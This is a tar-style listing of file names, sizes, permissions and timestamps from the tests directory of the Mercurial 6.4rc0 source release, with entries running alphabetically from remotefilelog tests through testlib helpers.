+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5032 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-gcrepack.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1013 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-hgweb.t
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)    10399 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-histpack.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3399 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-http.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1002 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-keepset.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5647 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-linknodes.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5284 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-local.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2635 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-log.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1718 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-partial-shallow.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1237 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-permissions.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8432 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-prefetch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2227 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-pull-noshallow.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5932 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-push-pull.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14742 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-repack-fast.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18642 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-repack.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      639 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-share.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2988 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-sparse.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2005 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-strip.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2088 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-tags.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1030 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remotefilelog-wireproto.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18551 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-remove.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7390 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-removeemptydirs.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2525 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rename-after-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8079 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rename-dir-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5859 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rename-merge1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30910 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rename-merge2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3215 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rename-rev.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15409 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rename.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4406 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-repair-strip.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6043 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-repo-compengines.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3382 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-repo-filters-tiptoe.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2909 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-requires.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22311 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-resolve.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      312 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revert-flags.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1161 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revert-interactive-curses.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9633 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revert-interactive.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      345 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revert-unknown.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32483 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revert.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      649 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revisions.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1944 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revlog-ancestry.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      298 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revlog-ancestry.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12412 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revlog-delta-find.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      685 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revlog-group-emptyiter.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1097 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revlog-mmapindex.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      511 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revlog-packentry.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16442 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revlog-raw.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      154 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revlog-raw.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2918 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revlog-v2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3265 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revlog.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      880 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revset-dirstate-parents.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10504 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revset-legacy-lookup.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2483 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revset-outgoing.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    55347 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revset.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    34705 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-revset2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      768 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rhg-no-generaldelta.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2613 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rhg-sparse-narrow.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10600 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rhg.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12185 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rollback.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2975 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-run-tests.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    54543 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-run-tests.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5485 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rust-ancestor.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4185 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rust-discovery.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1881 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-rust-revlog.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1484 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-schemes.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3083 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-serve.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1931 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-server-view.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    60184 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-setdiscovery.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8770 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-share-bookmarks.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19132 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-share-safe.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7567 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-share.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    38022 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-shelve.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25147 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-shelve2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4414 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-show-stack.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5189 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-show-work.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3946 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-show.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14157 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sidedata-exchange.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4210 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sidedata.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3274 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-simple-update.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3059 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-simplekeyvaluefile.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11514 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-simplemerge.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2837 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-single-head-obsolescence-named-branch-A1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2815 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-single-head-obsolescence-named-branch-A2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3029 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-single-head-obsolescence-named-branch-A3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2962 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-single-head-obsolescence-named-branch-A4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2811 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-single-head-obsolescence-named-branch-A5.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10780 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-single-head.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1239 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse-clear.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1582 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse-clone.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1266 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse-fsmonitor.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3685 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse-import.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4696 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse-merges.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5708 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse-profiles.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1592 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse-requirement.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14311 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse-revlog.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1747 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse-verbose-json.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      454 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse-with-safe-share.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9632 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sparse.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27906 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-split.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3352 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sqlitestore.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      565 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ssh-batch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16458 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ssh-bundle1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4591 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ssh-clone-r.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    46502 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ssh-proto-unbundle.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    38702 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ssh-proto.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1940 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ssh-repoerror.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20923 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ssh.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1517 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-sshserver.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4720 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-stack.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4376 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-state-extension.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8135 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-static-http.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14673 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-status-color.t
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      937 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-status-inprocess.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       62 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-status-inprocess.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6343 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-status-rev.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4065 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-status-terse.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5838 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-status-tracked-key.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18952 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-status.t
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     9417 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-stdio.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3892 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-storage.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6139 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-stream-bundle-v2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      451 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-strict.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1436 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-strip-branch-cache.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5565 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-strip-cross.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    43035 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-strip.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    43874 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-subrepo-deep-nested-change.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    29361 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-subrepo-git.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3694 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-subrepo-missing.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1236 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-subrepo-paths.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24140 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-subrepo-recursion.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6915 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-subrepo-relative-path.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18346 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-subrepo-svn.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    53049 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-subrepo.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1518 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-symlink-os-yes-fs-no.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      416 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-symlink-os-yes-fs-no.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1947 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-symlink-placeholder.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5186 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-symlinks.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25927 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-tag.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32700 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-tags.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25985 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-template-basic.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    43113 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-template-functions.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6671 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-template-graph.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32964 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-template-keywords.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    55583 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-template-map.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2905 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-tools.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5387 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-transaction-rollback-on-revlog-split.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2713 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-transaction-rollback-on-sigpipe.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6387 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-transaction-safety.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6552 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-transaction-wc-rollback-race.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27390 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-transplant.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9293 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-treediscovery-legacy.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19979 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-treediscovery.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25716 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-treemanifest.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8794 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-trusted.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4672 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-trusted.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      967 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ui-color.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       56 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ui-color.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4831 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ui-config.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1575 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ui-config.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1632 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ui-verbosity.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4290 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ui-verbosity.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8865 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-unamend.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1397 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-unbundlehash.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15437 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-uncommit.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2237 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-unified-test.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3655 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-unionrepo.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      900 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-unrelated-pull.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5447 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-up-local-change.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3456 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-update-atomic.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18603 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-update-branches.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1285 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-update-dest.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      857 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-update-issue1456.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2410 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-update-names.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1714 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-update-reverse.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    83006 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-upgrade-repo.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1930 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-url-download.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7801 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-url-rev.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14253 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-url.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      540 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-username-newline.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4262 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-util.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19219 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-verify-repo-operations.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10418 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-verify.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22413 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-walk.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2028 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-walkrepo.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1157 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-websub.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8428 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-win32text.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22957 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-wireproto-clientreactor.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8572 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-wireproto-framing.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    28449 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-wireproto-serverreactor.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2583 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-wireproto.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       51 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-wireproto.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15625 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-wireproto.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3850 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-worker.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19492 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-wsgirequest.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      264 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-xdg.t
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.278632 mercurial-6.4rc0/tests/testlib/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14930 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/badserverext.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      106 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/common.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      819 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/crash_transaction_late.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3631 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/exchange-obsmarker-util.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1024 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/ext-phase-report.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1565 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/testlib/ext-sidedata-2.py
